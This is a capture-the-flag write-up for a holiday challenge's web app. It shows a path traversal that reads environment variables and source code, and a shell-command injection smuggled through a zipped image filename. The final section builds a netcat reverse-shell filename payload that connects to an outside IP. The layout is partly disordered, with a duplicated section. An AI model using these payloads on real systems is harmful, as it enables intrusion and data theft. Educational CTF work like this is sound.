# Broken Tag Generator

**Difficulty**: :fontawesome-solid-star::fontawesome-solid-star::fontawesome-solid-star::fontawesome-solid-star::fontawesome-regular-star:<br/>
**Direct link**: [tag-generator website](https://tag-generator.kringlecastle.com/)<br/>
**Terminal hint**: [Redis Bug Hunt](../hints/h8.md)


## Objective

!!! question "Request"
    Help Noel Boetie fix the [Tag Generator](https://tag-generator.kringlecastle.com/) in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.

??? quote "Noel Boetie"
    Welcome to the Wrapping Room, Santa!

    The tag generator is acting up.

    I feel like the issue has something to do with weird files being uploaded.

    Can you help me figure out what's wrong?
    


## Hints

??? hint "Patience and Timing - Holly Evergreen"
    Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output!

??? hint "Source Code Analysis - Holly Evergreen"
    I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark?

??? hint "Endpoint Exploration - Holly Evergreen"
    Is there an endpoint that will print arbitrary files?

??? hint "Content-Type Gotcha - Holly Evergreen"
    If you're having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)!

??? hint "Error Page Message Disclosure - Holly Evergreen"
    Can you figure out the path to the script? It's probably on error pages!

??? hint "Download File Mechanism - Holly Evergreen"
    Once you know the path to the file, we need a way to download it!

??? hint "Source Code Retrieval - Holly Evergreen"
    We might be able to find the problem if we can get source code!

??? hint "Redirect to Download - Holly Evergreen"
    If you find a way to execute code blindly, I bet you can redirect to a file then download that file!


## Solution

!!! note "Quick 'n dirty or reverse shell?"
    You can either solve this with minimal effort or you can go for a reverse shell. We'll explore both options! :smile:

### Path Traversal

Start by analyzing the [app.js](https://tag-generator.kringlecastle.com/js/app.js) JavaScript code. After a successful file upload the uploaded image will be accessible via the `/image?id=` endpoint (line 7) with `id` being a randomly generated value that identifies the image. 

```javascript linenums="1" hl_lines="7"
success: function (data) {
  $('.uploadForm')[0].reset();
  $('[for=file-1] span').text('Select file(s)');
  setTimeout(() => {
    data.forEach(id => {
      var img = $('<img id="dynamic">');
      img.attr('src', `/image?id=${id}`);
      img.on('load', () => {
        const imgElement = img[0];
        var imgInstance = new fabric.Image(imgElement, {
          left: (canvas.width - imgElement.width) / 2,
          top: (canvas.height - imgElement.height) / 2,
          angle: 0,
          opacity: 1
        });
        canvas.add(imgInstance);
      });
    });
  }, 500);
},
```

### Short solution

The `/image?id=` endpoint appears to be vulnerable to a [path traversal attack](https://owasp.org/www-community/attacks/Path_Traversal), allowing us to read files on the remote system. Since the objective is to read the value of an environment variable and pretty much everything on Linux is considered a file, a request to `/image?id=../../../proc/1/environ` will return the information we need in the HTTP response, including `GREETZ`. :stuck_out_tongue_winking_eye:

![Short solution](../img/objectives/o8/solution_short.png)


### Longer solution

An HTTP request using an invalid `id` value will result in a 404 error response with a message stating `Error in /app/lib/app.rb: Route not found`. This tells us the location of the backend Ruby on Rails source code file.

![HTTP request error](../img/objectives/o8/raw_response.png)

!!! info "Tricking web browsers using `X-Content-Type-Options: nosniff`"
    The `X-Content-Type-Options: nosniff` header in the HTTP response message prevents web browsers from doing MIME-type sniffing. The web browser will take whatever is set as the `Content-Type` and assume that information is correct. In this case, the HTTP response tells the browser the data is an `image/jpg` file which the browser fails to render. As a result, using an invalid `id` in a web browser will display an image rendering error instead.

    ```
    The image “https://tag-generator.kringlecastle.com/image?id=somethingsomething%20test” cannot be displayed because it contains errors.
    ```




!!! done "Answer"
    JackFrostWasHere

!!! quote "Noel Boetie"
    Yay! You found the flaw!
    
    We'll work on fixing it.







----------


### Longer solution
We can also use the path traversal on `/image?id=` to grab the `app.rb` Ruby file using [](https://tag-generator.kringlecastle.com/image?id=../../../app/lib/app.rb). Now that we have the backend source code we can check for vulnerabilities to exploit here as well. The most interesting one is the `system()` call which will allow us to execute arbitrary code since it uses the `filename` variable as-is.

```ruby
def handle_image(filename)
  out_filename = "#{ SecureRandom.uuid }#{File.extname(filename).downcase}"
  out_path = "#{ FINAL_FOLDER }/#{ out_filename }"

  # Resize and compress in the background
  Thread.new do
    if !system("convert -resize 800x600\\> -quality 75 '#{ filename }' '#{ out_path }'")
      LOGGER.error("Something went wrong with file conversion: #{ filename }")
    else
      LOGGER.debug("File successfully converted: #{ filename }")
    end
  end
```

Similar to how SQL injection works, we need to make sure we don't mess up the quotes. If we want our code to be run we need to make sure it looks something like `myfile';command_to_run;ls '`.

1. `myfile';`: close the quote and end the convert command with `;`
2. `command_to_run;`: insert the command you want to run on the server, end with a `;`
3. `ls '`: make sure the second quote is closed as well

How do we get to this portion of the code though? The reverse order of the function calls is `handle_image`, `process_file`, `process_files`, and finally the `/upload` application endpoint. If we can get a file with a specific filename to the `system()` function, we can force the application to run our custom code.

There's a caveat though. File uploads get a random file name so whatever we call our image file, it ultimately gets changed into something else. The solution is to zip the file and upload that instead. It doesn't matter what the uploaded zip file gets renamed to, its contents will remain intact, especially since Jack Frost commented out the filename validation code in the `handle_zip()` function.

``` ruby
# I wonder what this will do? --Jack
# if entry.name !~ /^[a-zA-Z0-9._-]+$/
#   raise 'Invalid filename! Filenames may contain letters, numbers, period, underscore, and hyphen'
# end
```

We can now get the value of the `GREETZ` environment variable by creating an image file named `myfile';echo $GREETZ>the_GREETZ_tag.txt;ls '.png` which writes the `GREETZ` envvar to `/tmp/the_GREETZ_tag.txt`, add it to a zip file, and upload it using the tag generator application. Once the zip is unpacked and the image file used as a parameter to the `convert` system command, the `echo $GREETZ>the_GREETZ_tag.txt` code will be executed. We can't specify a full output path since forward slash characters can't be put in the file name. However, the code tells us that the working directory is `/tmp`. So we can just drop our file there and then use the previous path traversal trick to grab it from there

```ruby
TMP_FOLDER = '/tmp'
FINAL_FOLDER = '/tmp'

# Don't put the uploads in the application folder
Dir.chdir TMP_FOLDER
```

Upload the file and request [](https://tag-generator.kringlecastle.com/image?id=../../../tmp/the_GREETZ_tag.txt). The response contains the string 'JackFrostWasHere', which is the answer to the challenge.

### But wait, there's more!
Knowing how to bypass the application to get remote code execution, we can leverage this technique to get a reverse shell with full interactive access to the challenge host. The command we need to run on the host is `nc 1.2.3.4 55100 -e /usr/bin/bash`, but we already established that forward slashes are not an option. The workaround is to use `which` to ask the system what the shell binary path is, instead of specifying it ourselves. Our image file name now becomes `myfile';nc 1.2.3.4 55100 -e ``which sh``;ls '.png`. Set up a local listener using `nc -nlvp 55100`, upload the zipped image file, and wait for the reverse shell connection to be established.

![ImageName](../path/to/image/o8_1.png)

